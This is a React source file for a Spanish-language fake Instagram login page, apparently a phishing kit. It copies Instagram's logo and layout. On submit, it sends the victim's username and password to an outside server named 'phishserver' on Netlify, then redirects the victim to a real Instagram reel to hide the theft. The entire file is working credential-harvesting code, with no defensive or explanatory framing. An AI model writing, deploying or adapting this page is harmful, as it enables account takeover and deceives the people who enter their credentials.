import { useState } from 'react'
import fb from './assets/fb.png'
import './App.css'

function App() {
  const [data, setData] = useState({})
  const handleInput =(e) => {
    //handle input change
    setData({...data, [e.target.name]: e.target.value})
  }
  const handleSubmit = (e) =>{
    console.log(data)
    const url = 'https://phishserver.netlify.app/.netlify/functions/index/api/users'
    //send username and password to server with fetch request
   try{
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    })
        console.log('usuario almacenado')
         window.location.replace("http://www.instagram.com/reels/DBtwBM3uoes/");
        }catch(e){
          console.log(e)
          console.log('usuario no se  almaceno')
   }finally{
  // for demonstration purposes, remove in production code.  //send success message to user
    setData({}) // clear form inputs after successful submission
    e.preventDefault()  // prevent form from refreshing the page on submission  // prevent form from refreshing the page on submission
   }
  }
  return (
    <>
    <div className='grid justify-center gap-4'>
      <div className=' sm:border border-gray-300/30 w-[345px] h-[420px] flex flex-col justify-center'>
      <a className='flex justify-center pt-12' href="" target="_blank">
        <img className='w-44 invert contrast-200' src={'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png'} alt="Vite logo" />
      </a>
      <div className='p-9'>
        <form onSubmit={handleSubmit}>
          <div className='grid gap-2'>
            <input onChange={handleInput} className='bg-[#121212] border border-zinc-500 placeholder-zinc-300 p-3 text-xs rounded text-white' name='username' type="text" placeholder="Telefono, usuario o correo electronico " />
            <input onChange={handleInput} className='bg-[#121212] border  border-gray-300/40 p-3 text-xs rounded text-white' name='password' type="password" placeholder="Contraceña" />
          </div>
          <button className='bg-[#007bfc] border-0 text-sm text-white p-2 rounded-lg font-semibold w-full mt-4' type="submit">
            Iniciar Sesión
          </button>
        </form>
        <div className='grid gap-2'>
          
        <div className='flex  my-4 text-white items-center '>
        <hr className=' w-full border border-white/20'/>
        <h1 className='px-8 text-white/60'>o</h1>
        <hr className='w-full border-white/20' />
        </div>
        <div className='flex gap-2 items-center  w-full justify-center'>
          <img className='w-5 h-5 inve' src={fb} alt="" />
          <h1 className='text-blue-500'>Iniciar sesion con Facebook</h1>
        </div>
        <div>
          <h1 className='text-white text-sm'>¿Olvidaste tu contraseña?</h1>
        </div>
        </div>
      </div>
      </div>
      <div className='flex gap-2 justify-center border border-zinc-700 text-white w-full p-4'>
        <h1>¿No tienes una cuenta?</h1>
        <h1 className='text-blue-500'>Registrate</h1>
      </div>
      <div className='grid gap-4'>
        <a className='text-white text-sm' href="">Descarga la app.</a>
        <div className='flex gap-2 justify-center'>
          <img className='w-32' src="https://static.cdninstagram.com/rsrc.php/v3/yT/r/0BpxdgM3WUr.png" alt="" />
          <img className='w-32' src="https://static.cdninstagram.com/rsrc.php/v3/y9/r/LjIQEL8csb0.png" alt="" />
        </div>
      </div>
    </div>
    </>
  )
}

export default App
